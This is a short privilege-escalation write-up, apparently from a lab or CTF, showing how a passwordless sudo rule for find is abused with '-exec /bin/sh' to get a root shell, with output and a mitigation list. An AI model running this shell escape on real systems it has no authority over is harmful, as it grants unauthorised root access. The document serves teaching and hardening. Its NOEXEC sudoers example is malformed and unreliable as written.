# Privilege Escalation – Sudo (Shell Escape via find)

##  Enumeration
```bash
During initial enumeration, sudo permissions for the current user were checked:

sudo -l
```
Output:
```bash
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```
## Analysis
The user can execute /usr/bin/find as root without a password.
According to GTFOBins, the find binary supports shell escape via the -exec option, making it a viable privilege escalation vector.

 ## Exploitation (Shell Escape)

The -exec option of find was abused to spawn a root shell:
```bash
sudo find /bin -name nano -exec /bin/sh \;
```
How it works
* find is executed with root privileges via sudo
* The -exec flag allows execution of /bin/sh
* The spawned shell inherits UID 0 (root)

 Result
```bash
sh-4.1# whoami
root

sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
```
 Privilege escalation successful

 ## Mitigation
 
1.) Remove unnecessary sudo permissions from users

2.) Avoid allowing GTFOBins-listed binaries in sudoers

3.) Use NOEXEC where possible:
```bash
/usr/bin/find NOEXEC
```
4.)Enforce secure_path in /etc/sudoers

5.) Regularly audit sudo permissions using:

```bash
sudo -l
```
